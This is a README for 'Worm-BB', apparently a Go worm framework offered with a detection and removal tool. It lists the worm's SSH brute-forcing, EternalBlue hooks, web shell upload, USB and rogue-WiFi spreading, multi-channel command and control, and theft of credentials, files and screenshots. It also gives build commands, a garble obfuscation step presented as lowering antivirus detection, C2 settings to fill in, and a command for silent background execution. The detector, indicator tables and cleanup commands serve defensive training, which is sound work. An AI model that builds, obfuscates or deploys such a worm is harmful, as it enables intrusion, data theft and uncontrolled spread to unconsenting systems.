# Worm-BB: Advanced Self-Replicating Framework for Red & Blue Teams

![ek0ms Banner](https://img.shields.io/badge/ek0ms-certified_ethcial_hacker-blue)

![image1(1)](https://github.com/user-attachments/assets/c4cd71ae-1fce-4892-a3ae-c6fd9fe8ba3d)


**Educational Purpose Only**

Worm-BB is a research-grade, multi-platform worm framework written in Go. It demonstrates modern autonomous propagation techniques, stealth command & control, USB and WiFi-based spreading, web shell persistence, and data exfiltration. The companion detection and removal tool helps blue teams identify and eradicate Worm-BB infections in authorized environments.

**This repository is for authorized security testing, research, and defense training only.** 
---

## Overview

Worm-BB implements the classic worm trinity: **Scan → Exploit → Replicate**. It spreads across networks, USB drives, and rogue WiFi access points, establishes deep persistence on Windows and Linux, and communicates with a C2 server via WebSockets, DNS tunneling, and HTTP beacons. The detector tool (`worm_bb_detector`) scans for all known Worm-BB artifacts – processes, files, registry keys, scheduled tasks, cron jobs, systemd services, WMI subscriptions, USB autorun files, and network multicast traffic.

Both components are written entirely in Go, making them cross‑platform, statically linked, and difficult to detect by signature‑based AVs (when compiled with obfuscation).

---

## Capabilities

### Worm Framework (`worm.go`)

| Module               | Description |
|----------------------|-------------|
| **SSH Bruteforce**   | Default credential list (`root:root`, `admin:admin`, etc.) + payload deployment. |
| **SMB/EternalBlue**  | Detection of port 445; exploit hooks ready. |
| **WebShell**         | Uploads PHP/ASP/Python shells via PUT, POST, FTP, WebDAV; backdoor deployment. |
| **USB Propagation**  | Monitors removable drives, copies worm, creates `autorun.inf` (Windows) or udev rules (Linux), hides files. |
| **WiFi Evil Portal** | Rogue AP with DNS spoofing, captive portal, deauth attack; forces worm download. |
| **P2P Coordination** | Multicast peer discovery (`239.255.42.42:4242`), leader election, population management. |
| **C2 Channels**      | WebSocket (WSS), DNS tunneling (A/TXT queries), HTTP/S beacons with random User-Agent. |
| **Data Exfiltration**| Batched, AES‑encrypted exfil to MySQL or HTTPS endpoint; steals creds, files, screenshots. |
| **Persistence**      | Windows: Run keys, scheduled tasks, WMI, startup folder. Linux: crontab, systemd, SSH keys, udev. |

### Detection & Removal Tool (`worm_bb_detector.go`)

| Scan Type            | Detects                                                                 |
|----------------------|-------------------------------------------------------------------------|
| Processes            | Names `system-update`, `SystemUpdate`, `worm_bb`, suspicious cmdline.   |
| Filesystem           | Known worm paths, temp directories, USB autorun files.                  |
| Registry (Windows)   | Run keys containing `SystemUpdate`.                                     |
| Scheduled Tasks      | `SystemUpdateTask`, `SystemUpdateTask_startup`.                         |
| WMI (Windows)        | `__EventFilter` named `SystemUpdateFilter`.                             |
| Cron (Linux)         | `@reboot /tmp/system-update`, `*/30 * * * * /tmp/system-update`.        |
| Systemd (Linux)      | `system-update.service`.                                                |
| udev (Linux)         | `99-usb-autorun.rules`.                                                 |
| SSH Keys             | `authorized_keys` containing `worm-bb-key`.                             |
| USB Drives           | `autorun.inf`, `SystemUpdate.exe`, `.lnk` files.                        |
| Network              | Multicast listener on `239.255.42.42:4242`, listening ports 4242–8443.  |
| Memory (basic)       | Loaded module strings on Windows (`tasklist /M`).                       |

Remediation actions are generated for each finding: kill processes, delete files, remove registry keys, clean cron/systemd, purge USB malware, and delete WMI subscriptions. The tool supports interactive (prompt per action) or fully automatic (`--auto`) mode.

---

## Build Instructions

### Prerequisites

- Go 1.16+ (`go version`)
- Optional dependencies for WiFi module (Linux only):
  ```bash
  sudo apt install libnl-3-dev libnl-genl-3-dev libpcap-dev hostapd dnsmasq
  ```
- For cross‑compilation to Windows (optional):
  ```bash
  sudo apt install gcc-mingw-w64-x86-64
  ```

### Install Go Dependencies

```bash
go mod init worm_bb
```

```bash
go get -u github.com/google/gousb
go get -u github.com/gorilla/websocket
go get -u github.com/miekg/dns
go get -u github.com/go-sql-driver/mysql
go get -u golang.org/x/crypto/ssh
go get -u golang.org/x/sys/windows
go get -u golang.org/x/sys/windows/registry
```

### Compile the Worm (`worm.go`)

```bash
# Linux (x86_64)
CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb worm.go

# Windows (x86_64) – hide console
CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w -H=windowsgui" -o worm_bb.exe worm.go

# macOS (Intel)
CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_mac worm.go

# ARM (Raspberry Pi)
CGO_ENABLED=1 GOOS=linux GOARCH=arm GOARM=7 CC=arm-linux-gnueabihf-gcc go build -ldflags="-s -w" -o worm_bb_arm worm.go
```

### Compile the Detector (`worm_bb_detector.go`)

```bash
# Linux
go build -ldflags="-s -w" -o worm_bb_detector worm_bb_detector.go

# Windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_detector.exe worm_bb_detector.go

# macOS
GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_detector_mac worm_bb_detector.go
```

### Obfuscation (Optional, Lowers Detection Rate)

```bash
go install mvdan.cc/garble@latest
garble -literals -tiny -seed=random build -ldflags="-s -w" -o worm_bb_obf worm.go
```

---

## Usage – Worm Framework

**Before you run:** Change the C2 constants in `worm.go` to point to your own infrastructure (WebSocket, DNS domain, exfil endpoint). 

```go
const (
    C2_WEBSOCKET = "wss://your-c2.com:8443/ws"
    C2_DNS_DOMAIN = "your-c2.com"
    DATA_EXFIL_SERVER = "https://your-c2.com:8443/upload"
)
```

### Run the Worm

```bash
# Linux – background, no output
./worm_bb > /dev/null 2>&1 &

# Windows – hidden (compiled with -H=windowsgui)
worm_bb.exe

# Manual execution with output (for debugging)
./worm_bb
```

On first run, the worm:
1. Checks for existing instances (mutex, lock file, listening ports).
2. Installs persistence (registry, crontab, systemd, etc.).
3. Joins the P2P multicast group.
4. Begins scanning and propagating.

### Behaviour Tuning

The worm automatically selects a propagation strategy based on local population:
- `FULL_INSTALL` – no other worms → aggressive scanning.
- `SUPPLEMENT_PROPAGATION` – few worms → fill gaps.
- `COORDINATED_SCAN` – many worms → leader distributes tasks.
- `EXPAND_NETWORK` – current network saturated → random /24 scans.
- `STEALTH_MODE` – high density → one host per 5 minutes.

### Cleanup

To remove the worm after testing, either run the detection tool (see next section) or manually delete:

```bash
# Linux
pkill -f system-update
rm -f /tmp/system-update /etc/systemd/system/system-update.service
crontab -l | grep -v system-update | crontab -
rm -f /etc/udev/rules.d/99-usb-autorun.rules

# Windows
taskkill /F /IM SystemUpdate.exe
schtasks /delete /tn SystemUpdateTask /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /f
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe"
```

---

## Usage – Detection & Removal Tool

The detector scans for all Worm-BB indicators and optionally removes them.

### Basic Scan (Interactive)

```bash
# Linux (run as root for full coverage)
sudo ./worm_bb_detector

# Windows (run as Administrator)
worm_bb_detector.exe
```

You will be prompted before each remediation action.

### Fully Automatic Scan & Clean

```bash
sudo ./worm_bb_detector --auto --network
```

- `--auto` – automatically executes all remediations without prompting.
- `--network` – enables multicast listener test and port scanning.

### Save JSON Report

```bash
sudo ./worm_bb_detector --output scan_report.json
```

### Example Output

```
================================================
WORM-BB DETECTION AND REMOVAL TOOL
Version: 1.0
================================================
[*] Scanning for worm processes...
[*] Scanning for worm files...
[!] WORM DETECTED! Severity: HIGH
[!] Found 4 indicators
...
[?] Remediation: KILL_PROCESS
    Target: PID 1337
    Command: kill -9 1337
    Execute? (y/N): y
[+] Success: KILL_PROCESS completed
...
[+] All remediations completed successfully!
```

### Exit Codes

| Code | Meaning                     |
|------|-----------------------------|
| 0    | No worm detected            |
| 1    | Worm detected and remediated|

---

## Ethical & Legal Disclaimer

**This software is provided for educational and authorized security testing only.**

![image1(1)](https://github.com/user-attachments/assets/4e693f4d-10f3-43e2-b204-2c1585e03535)

---

#Read my wormBB research, walk thru and articles here:

https://medium.com/@ekoms1/the-fascinating-world-of-self-replicating-worms-0e6ad768a001

https://substack.com/@ek0mssavi0r/p-193527720
